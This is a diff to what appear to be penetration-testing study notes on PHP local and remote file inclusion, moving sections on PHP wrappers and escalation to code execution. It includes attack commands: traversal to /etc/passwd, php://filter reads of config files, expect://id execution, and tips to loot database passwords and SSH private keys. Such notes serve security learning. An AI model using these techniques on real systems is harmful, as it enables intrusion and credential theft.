@@ -7,12 +7,10 @@
 	* Approved Paths
 	* Appended Extension
 	* Filename Prefix
-* [PHP Filters](#php-filters)
-	* [Scenarios](#scenarios)
-		* Reading PHP files with convert filter
-* [From LCI to RCE](#from-lci-to-rce)
-	* [PHP wrappers](#php-wrappers)
+* [PHP Wrappers](#php-wrappers)
+	* [Using Wrappers](#using-wrappers)
 		* Data / Input / Expect
+* [From LCI to RCE](#from-lci-to-rce)
 	* [Remote File Inclusion](#remote-file-inclusion) (RFI)
 		* Python / FTP / SMB
 	* [File Uploads](#file-uploads)
@@ -27,9 +25,9 @@
 > [!Important]
 > [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
 > [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) Contains various bypasses.
-> Common web root paths:
-> - [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
-> - [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
+> [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) and [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) for common web root paths.
+>**DON'T FORGET THE PHP WRAPPERS** :{}
+
 
 ---
 ## Overview
@@ -93,37 +91,14 @@ If we were not sure of the directory the web application is in, we can add `../`
 	- If the web app takes an input `file` and appends `lang_` to it, resulting in `lang_../../../etc/passwd` which will be invalid path.
 		- Add `/` at the beginning of the path, `lang_/../../../etc/passwd`, the leading `/` might reset the path to root.
 ---
-## PHP Filters
+## PHP Wrappers
 - [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams.
 - 4 types of filters: [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php).
 - Main parameters for filter wrapper are `resource` and `read`.
 	- `resource` To specify the stream we would like to apply our filter on (e.g. local file).
 	- `read` To apply different filters on the input resource.
 	- The important filter for FI is `convert.base64-encode` filter, under [Conversion Filters](https://www.php.net/manual/en/filters.convert.php).
-###  Scenarios
-- **If we have a LFI and the site using appended extension to the user input and we want to read the local PHP files**:
-	1. Fuzzing to find PHP files.
-	   We are not restricted to pages with HTTP response code `200`, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.
-		``` bash
-		ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
-		configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
-		```
-	2.  We should use the payload `configure`: `www.example.com/index.php?lang=configure`
-		1. If the web app uses a [Read, Write and Execute Functions](#read-write-and-execute-functions) that executes the content of the file, it won't show the file content.
-		2. Using PHP wrapper with convert filter to encode the content of the file so it doesn't get executed
-		   `www.example.com/index.php?lang=php://filter/read=convert.base64-encode/resource=config`
-		3. Decode the output
-			``` bash
-			echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
-			```
----
-## From LCI to RCE
-> [!Note]
-> - `/etc/php/X.Y/apache2/php.ini` for Apache (`X.Y` is the PHP version installed).
-> - `/etc/php/X.Y/fpm/php.ini` for Nginx.
-> - Search for DB password in `config.php` and check for password reuse.
-> - Check `.ssh` directory on each user home directory for their private keys `id_rsa`.
-### PHP wrappers:
+### Using Wrappers:
 - [Data](https://www.php.net/manual/en/wrappers.data.php)
 	- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
 		``` bash
@@ -152,6 +127,28 @@ If we were not sure of the directory the web application is in, we can add `../`
 		``` bash
 		curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 		```
+		
+> [!Note]
+> If the app vulnerable to LFI but using appended extension to the user input, read the local PHP files carefully. Follow the next example:
+1. Fuzz find PHP files.
+   We are not restricted to pages with HTTP response code `200`, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.
+	``` bash
+	ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+	index                   [Status: 302, Size: 1343, Words: 1, Lines: 1, Duration: 69ms]
+	configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
+	```
+2. Using PHP wrapper with convert filter to encode the content of the file so it doesn't get executed then decode the output.
+	``` bash
+	curl www.example.com/index.php?lang=php://filter/read=convert.base64-encode/resource=config
+	echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
+	```
+---
+## From LCI to RCE
+> [!Note]
+> - `/etc/php/X.Y/apache2/php.ini` for Apache (`X.Y` is the PHP version installed).
+> - `/etc/php/X.Y/fpm/php.ini` for Nginx.
+> - Search for DB password in `config.php` and check for password reuse.
+> - Check `.ssh` directory on each user home directory for their private keys `id_rsa`.
 ### Remote File Inclusion:
 - Any RFI vulnerability is also an LFI vulnerability, but an LFI may not necessarily be an RFI. Check [Read, Write and Execute Functions](#read-write-and-execute-functions)
 - How to verify a RFI:
